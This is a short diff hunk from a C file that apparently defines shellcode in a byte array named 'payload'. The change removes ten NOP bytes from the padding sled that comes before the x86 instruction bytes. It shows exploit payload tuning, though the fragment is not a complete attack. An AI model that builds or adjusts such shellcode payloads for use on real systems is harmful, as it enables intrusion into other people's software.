@@ -39,8 +39,6 @@ unsigned char payload[] =
 	// And an additional 21 here
 	"\x90\x90\x90\x90\x90"
 	"\x90\x90\x90\x90\x90"
-	"\x90\x90\x90\x90\x90"
-	"\x90\x90\x90\x90\x90"
 	"\x90"
 	/* ------------------------------------	*/
 	"\x8b\x5c\x24\xfc"		/*[-_^]	*/
